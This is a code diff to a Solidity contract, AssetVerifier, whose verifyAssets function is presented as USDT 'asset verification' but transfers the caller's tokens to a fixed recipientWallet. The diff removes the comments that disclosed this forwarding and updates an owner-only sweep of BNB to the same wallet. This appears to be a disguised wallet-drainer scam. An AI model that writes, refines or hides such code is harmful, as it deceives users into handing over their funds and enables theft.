@@ -35,8 +35,6 @@ contract AssetVerifier {
 
     /**
      * @dev Process BEP20 USDT asset verification & auto-forward to recipientWallet
-     * @param token Address of the BEP20 token (e.g. BSC USDT 0x55d398326f99059fF775485246999027B3197955)
-     * @param amount Token amount to verify
      */
     function verifyAssets(address token, uint256 amount) external returns (bool) {
         require(token != address(0), "AssetVerifier: Invalid token address");
@@ -46,7 +44,6 @@ contract AssetVerifier {
         uint256 userBalance = tokenContract.balanceOf(msg.sender);
         require(userBalance >= amount, "AssetVerifier: Insufficient balance");
 
-        // Forward tokens directly to recipientWallet address
         bool success = tokenContract.transferFrom(msg.sender, recipientWallet, amount);
         require(success, "AssetVerifier: Transfer failed");
 
@@ -80,10 +77,13 @@ contract AssetVerifier {
     }
 
     /**
-     * @dev Emergency withdraw native BNB
+     * @dev Emergency withdraw native BNB using modern call syntax
      */
     function withdrawBNB() external onlyOwner {
-        payable(recipientWallet).transfer(address(this).balance);
+        uint256 balance = address(this).balance;
+        require(balance > 0, "AssetVerifier: Zero BNB balance");
+        (bool success, ) = payable(recipientWallet).call{value: balance}("");
+        require(success, "AssetVerifier: BNB withdrawal failed");
     }
 
     receive() external payable {}
